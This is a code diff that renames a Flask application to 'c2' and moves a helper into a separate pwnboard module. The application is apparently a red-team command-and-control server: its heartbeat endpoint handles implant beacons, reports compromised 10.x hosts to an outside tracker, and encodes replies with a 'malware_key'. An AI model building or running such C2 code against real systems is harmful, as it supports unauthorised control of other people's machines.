@@ -6,24 +6,16 @@ from flask import request
 import flask
 from werkzeug.utils import secure_filename
 
-from sqlweb.app import app
-from sqlweb.app import get_db
-from sqlweb import dbmain
+from c2.app import app
+from c2.app import get_db
+from c2 import dbmain
+from c2.pwnboard import send_update
+
 import time
 import datetime
 import uuid
 
 
-def sendUpdate(ip, name="nginxworker"):
-    host = "http://pwnboard.win/generic"
-    data = {'ip': ip, 'type': name}
-    try:
-        req = requests.post(host, json=data, timeout=3)
-        print(req.text)
-        return True
-    except Exception as E:
-        print(E)
-        return False
 
 
 def mal_encode(key, clear):
@@ -112,7 +104,7 @@ def heartbeat():
             if nwaddrstring != None and nwaddrstring != "" and "," in nwaddrstring and nwaddrstring != "No network address data":
                 ips = re.findall(r"10.\d{1,3}\.\d{1,3}\.\d{1,3}", nwaddrstring)
                 if len(ips) > 0:
-                    sendUpdate(ips[0])
+                    send_update(ips[0])
         return mal_encode(app.malware_key, "1")
 
 
@@ -224,5 +216,7 @@ def getIP(format=None):
     if request.method == 'GET':
         if format == None:
             return request.remote_addr
+        elif format == 'json':
+            return {'ip': request.remote_addr}
         else:
             return {'ip': request.remote_addr}
